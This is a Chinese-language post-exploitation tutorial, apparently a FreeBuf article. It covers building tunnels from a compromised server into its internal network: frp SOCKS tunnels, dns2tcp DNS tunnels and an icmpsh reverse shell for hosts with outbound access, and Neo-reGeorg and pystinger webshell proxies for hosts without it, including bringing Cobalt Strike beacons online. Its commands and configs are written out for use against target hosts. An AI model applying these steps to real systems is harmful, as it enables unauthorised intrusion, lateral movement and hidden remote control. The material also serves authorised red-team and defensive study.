> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IeH06p7pkQ3lmOehGLUWLg)

> 当拿到权限之后，做完本地信息收集，最重要的就是做个隧道，对内网进行下一步攻击，这里简单介绍几个常用的工具，主要针对于出网和不出网两种情况。

出网情况
----

拿到服务器权限之后，遇见这种机器，十分简单，针对不同情况搭建不同隧道，为了速度可以建立 sockets 隧道、为了隐蔽可以使用 dns 隧道、icmp 隧道等，本文简单介绍几个常用工具。

### frp

frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。

项目地址：https://github.com/fatedier/frp/

下载之后，我们只需要关注四个文件即可：

*   frps
    
*   frps.ini
    
*   frpc
    
*   frpc.ini
    

修改 frpc.ini，这里搭建 sockets 隧道，上传至目标服务器启动即可。

```
./frpc -c frpc.ini
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicWuia0znFqu24ROITL2sUUCeJFXukIYT7bOYFO49U4WbeyTBgLLr9ZhQ/640?wx_fmt=jpeg)

服务端根据 frps.ini 修改端口

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicJCbN99MWlDgNxhqESsekaxxjuPVSFT7sEFsaicx02OYk6Ye88ZL6NqQ/640?wx_fmt=jpeg)

启动监听

```
./frps -c frps.ini
```

即可建立 sockets 隧道，利用 Proxifierprox 等，即可全局代理隧道，访问目标主机内网。

### **dns**

这个比较麻烦需要准备一个域名，和一台 DNS 服务器，在域名解析添加一条 NS 记录和一条 A 记录。举个例子，域名是 123.com，添加一个子域名 a.123.com，且类型为 NS，并将 NS 记录指向 b.123.com，然后将 b.123.com 建立 A 记录服务器 IP 即可，利用的工具也很多，本文简单介绍 dns2tcp。

```
a.123.com NS b.123.com
b.123.com A 1.1.1.1
```

项目地址：https://github.com/HEYAHONG/dns2tcp

**客户端**

```
dns2tcpc -r nc -z a.123.com 1.1.1.1 -l 8888 -d 2  
-r 后接服务名称任意换, 本文用nc
-z 后接NS记录的网址
-l 后接本地端口
```

服务端

修改 dns2tcpd.conf，

```
listen = 0.0.0.0
port = 53
user = root
chroot = /home/
domain = a.123.com
key = 123
resources = ssh:127.0.0.1:22,smtp:127.0.0.1:25,socks:127.0.0.1:1080,http:127.0.0.1:80,https:127.0.0.1:8080
```

然后执行，dns 隧道就搭建好了，利用 nc 进行传输文件即可。

```
dns2tcpd -F -d 3 -f /home/dns2tcpd.conf
```

建立传输

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicKibJ6J7vbnWhicVfpsjypdJj1yTDylolexbJfGrriaRCVxwfZsYYc9nIQ/640?wx_fmt=jpeg)

目标主机监听并接受文件即可。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyic0dngCKiaaic4ad8r77vfTGhkibIL0YBfrlQUwT0Q9AUnzDMCQWWDGuJcg/640?wx_fmt=jpeg)

### icmp

icmp 隧道主要因为大部分防火墙不会屏蔽 ping ，所以可以将流量封装在 icmp 进行传输，这种速度跟 sockets 相比太慢了，特殊情况才会使用。

项目地址：https://github.com/inquisb/icmpsh

服务端：

python icmpsh_m.py ip 目标 ip

目标机

```
icmpsh.exe -t 目标ip
```

即可反弹 icmp 隧道 shell 回来。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicCqe3VWiarPg6v1hPsYAn7LqVmmaqicWEG9ibY65K9N3VsunHvWUsOOCibg/640?wx_fmt=jpeg)

不出网情况
-----

拿到服务器权限之后，遇见这种机器，只能利用基于 webshell 的代理，只需要将 webshell 上传到目标主机即可，然后建立 tcp 连接，主要利用 session 来识别不同的的 tcp 连接，我们攻击监听 tcp，将数据 post 提交到 webshell 即可进行传输，本文简单介绍两个常用的。

### Neo-reGeorg

**Neo-reGeorg** 相当于是 reGeorg 的升级版，有了更强的隐蔽性，原理都是相同的，常用于 webshell 代理流量，进而进行内网渗透。

项目地址：https://github.com/L-codes/Neo-reGeorg

首先需要设置密码，生成各种类型 webshell，并上传至目标服务器

```
python neoreg.py generate -k password
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicvXc63QPXh2p1Gh9kTuYttQBBASVUa7vWibepiau6eRgSR61mfKmAEVeQ/640?wx_fmt=jpeg)

上传至服务器即可，然后启动监听即可

```
python neoreg.py -k password -u http://1.1.1.1/tunnel.php
```

最后挂上 sockets 代理即可访问内网。

### pystinger

毒刺 (pystinger) 通过 webshell 实现内网 socks4 代理，并且可以利用 pystinge 实现各种 cs\msf 上线，目前仅支持 php、jsp(x)、aspx.

项目地址：https://github.com/FunnyWolf/pystinger

这个工具比较强大，这里可以直接上线 cs，简单介绍如何搭建 socks4 以及 cs 上线。

socks4 隧道搭建：

首先上传 proxy.php，然后上传 stinger_server.exe 到目标服务器，并 start 命令运行该程序

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicqGO5iczfUhLFAHcRZD12tAiciaUuhybP06iaFIcXFD7RXOjDd4j3551bXQ/640?wx_fmt=jpeg)

最后在我们的服务器执行

```
./stinger_client -w http://1.1.1.1/proxy.php -l 0.0.0.0 -p 60000
```

即可建立 socks4 隧道，利用 Proxifierprox 等，访问目标主机内网。

cs 上线：

前面大体相同，首先上传 proxy.php，然后上传 stinger_server.exe 到目标服务器，启动利用冰蝎 start 启动即可

我们的服务器也需要进行监听

```
./stinger_client -w http://1.1.1.1/proxy.php -l 0.0.00 -p 60000
```

然后 cs 进行监听，端口填写 60020

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicUt5bxu1iaZNR2EooPgpnD1L1s3TUfDibJvNc0iam0oLvKYhrKovQOATmw/640?wx_fmt=jpeg)

进而利用 cs 生成 powershell

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyic24Fx9VqUBMDDmAkD3JTxHSyejwZw1mbFDvNkklfCsHCicGibTmQmC8iaQ/640?wx_fmt=jpeg)

执行可以利用 pystinger，进行不出网主机上线。

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicm3bm2UibszTAMS5fvXeibZhF2siaFFbohMq9rW4dFiaVGaTleadIR3Y08g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39et1eibyCN47vicZaWTArxyicJ9Bz1Kqa0sia5Ub5A4SqwwfxTkenQJtpRH5kdWRrxVpfBrFdlcqQ59g/640?wx_fmt=jpeg)

End
---

**这里只是抛砖引玉，引出一些在之前工作中针对于不出网以及出网主机，用过最多的几个隧道代理工具，还请各位大佬勿喷，有更好的工具多补充，共同交流，这样我们才能共同成长，格拉德威尔曾说过：“人们眼中的天才之所以卓越非凡，并非天资超人一等，而是付出了持续不断的努力。1 万小时的锤炼是任何人从平凡变成世界级大师的必要条件 “。**

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif)

![](http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png&wxfrom=200) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序

精彩推荐

  

  

  

  

****![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg)****

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3icpSmNbdiaVpmTEfDHJFoS2OIO0ibau3Xo0W3W5icSIT9hIQY4gmlK4nOY8jcVq2hngIe7Fug8w6lHyQ/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484287&idx=1&sn=16a9b2dc0e205a0e5fe86ae5cae9fe2e&scene=21#wechat_redirect)[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39823fgk2Py1fbU5wCoewwO0AKFIGmCLF6bY37GDicGMDRicgQf6xW1jtjY8Raby8RjiauX5205Zg8Dg/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484370&idx=1&sn=8b79701a2936e04e390f165344e5fcdc&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR38zicMqOsJkQvPpKaPxqjyZ7deMd3Oj2po4iclibkAAzPLIHN0KQpUYHsrhB0Zr9GzsFGzwQ6cEZK0xw/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485015&idx=1&sn=f4d53ab1890ba767f16c9fb7dde98614&scene=21#wechat_redirect)[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR395MJ3ibGiapKdwibvJEt7GcNUQye5jkUUee36y34MlQnTJMMJj7VlLR9ssECeSEzDU5HqD7MicfAaoFg/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484953&idx=1&sn=746a4872efe570131f9208600d50e936&scene=21#wechat_redirect)[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3icf8XBadpw5Ldchfo3ic9l4FtYPbq8ka1zKl1sXr080NicwuGNE7p78LGJulKS9kgH9v24BApl5eTTg/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247484931&idx=1&sn=5b40049403f5ca447f2f99ebe43ece6d&scene=21#wechat_redirect)

**************![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif)**************